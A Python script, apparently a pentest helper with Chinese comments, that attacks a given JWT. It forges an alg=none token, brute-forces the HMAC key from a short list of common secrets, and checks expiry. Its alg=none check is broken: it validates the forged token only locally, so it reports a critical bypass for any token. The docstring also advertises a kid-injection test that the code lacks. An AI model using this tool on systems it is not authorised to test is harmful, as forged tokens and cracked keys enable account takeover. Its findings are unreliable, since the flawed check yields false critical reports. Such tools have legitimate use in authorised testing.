"""jwt_attack — JWT token 弱点检测。

自动测试: alg=none / 弱 HMAC / kid 注入 / 过期忽略。
用法:
  python jwt_attack.py --token eyJ... --json

需要: pip install pyjwt
"""

import argparse
import base64
import json
import sys

try:
    import jwt
except ImportError:
    print("[!] PyJWT not installed: pip install pyjwt", file=sys.stderr)
    sys.exit(1)

_WEAK_HMAC_KEYS = ["secret", "key", "password", "admin", "jwt_secret", "supersecret",
                    "123456", "changeme", "private", "secretkey"]


def _decode_without_verify(token: str) -> dict:
    try:
        return jwt.decode(token, options={"verify_signature": False})
    except Exception:
        return {}


def _test_none_alg(token: str) -> dict | None:
    """alg=none 攻击。"""
    try:
        decoded = jwt.decode(token, options={"verify_signature": False, "verify_exp": False})
        # Re-encode with alg=none
        none_token = jwt.encode(decoded, "", algorithm="none")
        # Try to decode it back
        test = jwt.decode(none_token, options={"verify_signature": False})
        if test == decoded:
            return {
                "type": "jwt_vulnerability",
                "attack": "alg_none",
                "severity": "critical",
                "detail": "JWT accepts alg=none - signature bypass",
                "forged_token": none_token,
            }
    except Exception:
        pass
    return None


def _test_weak_hmac(token: str) -> list[dict]:
    """弱 HMAC 密钥爆破。"""
    results = []
    header = jwt.get_unverified_header(token)
    if header.get("alg", "").startswith("HS"):
        for key in _WEAK_HMAC_KEYS:
            try:
                jwt.decode(token, key, algorithms=["HS256"])
                results.append({
                    "type": "jwt_vulnerability",
                    "attack": "weak_hmac",
                    "severity": "high",
                    "key": key,
                    "detail": f"JWT signed with weak HMAC key: {key}",
                })
            except jwt.InvalidSignatureError:
                continue
            except Exception:
                continue
    return results


def _test_expired(token: str) -> dict | None:
    """过期 token 复用。"""
    try:
        jwt.decode(token, options={"verify_signature": False})
        return None  # not expired
    except jwt.ExpiredSignatureError:
        payload = _decode_without_verify(token)
        if payload:
            return {
                "type": "jwt_vulnerability",
                "attack": "expired_token",
                "severity": "low",
                "detail": "JWT expired but payload readable - check if server accepts expired tokens",
            }
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--token", required=True, help="JWT token string")
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args()

    results = []

    payload = _decode_without_verify(args.token)
    if payload:
        results.append({"type": "jwt_info", "payload": json.dumps(payload, default=str)[:500], "algorithm": jwt.get_unverified_header(args.token).get("alg", "?")})

    r = _test_none_alg(args.token)
    if r:
        results.append(r)

    results.extend(_test_weak_hmac(args.token))

    r = _test_expired(args.token)
    if r:
        results.append(r)

    if args.json:
        for r in results:
            print(json.dumps(r, ensure_ascii=False))
    else:
        for r in results:
            print(f'[{r.get("severity","info")}] {r.get("attack","")}: {r.get("detail","")[:100]}')
    return 0


if __name__ == "__main__":
    main()
